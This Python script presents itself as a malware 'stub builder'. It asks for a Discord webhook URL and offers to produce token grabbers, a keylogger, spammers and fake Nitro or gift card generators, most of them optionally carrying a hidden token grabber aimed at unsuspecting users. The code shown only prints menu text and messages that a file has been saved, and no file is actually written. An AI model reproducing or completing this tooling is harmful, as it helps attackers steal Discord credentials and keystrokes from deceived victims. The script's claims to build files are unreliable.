from time import sleep
from serverlink import disc
import sys
import time
import pyfiglet


# Made by Mal


    # Banner
banner = pyfiglet.figlet_format("Mal's Stub Builder v1.0.0")
print(banner)

print("Please Insert Your WebHook URL:")
web = input()
print("More at: " + disc + '\n')

print("Please insert the name of your files you will create:")
name = input()

print("Type: Y/N  (Non Token Grabber or with hidden Token Grabber)")
non = input().lower()

    # Options to build
print('''
    ########################################################################
                        https://discord.gg/qqExcWPkJ4
                               | MADE BY MAL |  
                               
                The S_(example) files means its not a token grabber
                                                                                      
                  Option 1: Token Gen (Token Grabber & Non Token Grabber)
                  Option 2: Webhook Spammer (Token Grabber & Non Token Grabber)
                  Option 3: PRO Token Grabber
                  Option 4: Token Grabber (Grabs their token & Non Token Grabber)
                  Option 5: Spammer (Token Grabber & Non Token Grabber)
                  Option 6: Nitro Gen+Checker (Token Grabber & Non Token Grabber)
                  Option 7: Proxy Scraper (Token Grabber & Non Token Grabber)
                  Option 8: Email Scraper (Token Grabber & Non Token Grabber)
                  Option 9: KeyLogger (Token Grabber & Non Token Grabber)
                  Option 10: GiftCard Gen (Token Grabber & Non Token Grabber)
                               | MADE BY MAL |
                        https://discord.gg/qqExcWPkJ4                                   
    #########################################################################
''')

print("Insert what option you want to Build:")
build = input()

    # Option downloads
OP_1 = 'has been saved as Token Gen.py'
OP_2 = 'has been saved as Webhook Spammer.py'
OP_3 = 'has been saved as PRO Token Grabber.py'
OP_4 = 'has been saved as Token Grabber.py'
OP_5 = 'has been saved as Spammer.py'
OP_6 = 'has been saved as Nitro Gen+checker.py'
OP_7 = 'has been saved as ProxyScraper.py'
OP_8 = 'has been saved as EmailScraper.py'
OP_9 = 'has been saved as KeyLogger.py'
OP_10 = 'has been saved as GiftCard_Gen.py'

    # Option Response
if build == '1':
    print("Your Build: " + OP_1 + '\n' + disc)

elif build == '2':
    print("Your Build: " + OP_2 + '\n' + disc)

elif build == '3':
    print("Your Build: " + OP_3 + '\n' + disc)

elif build == '4':
    print("Your Build: " + OP_4 + '\n' + disc)

elif build == '5':
    print("Your Build: " + OP_5 + '\n' + disc)

elif build == '6':
    print("Your Build: " + OP_6 + '\n' + disc)

elif build == '7':
    print("Your Build: " + OP_7 + '\n' + disc)

elif build == '8':
    print("Your Build: " + OP_8 + '\n' + disc)

elif build == '9':
    print("Your Build: " + OP_9 + '\n' + disc)

elif build == '10':
    print("Your Build: " + OP_10 + '\n' + disc)

else:
    print('\n' + "Invalid Option")
    time.sleep(1)
    exit()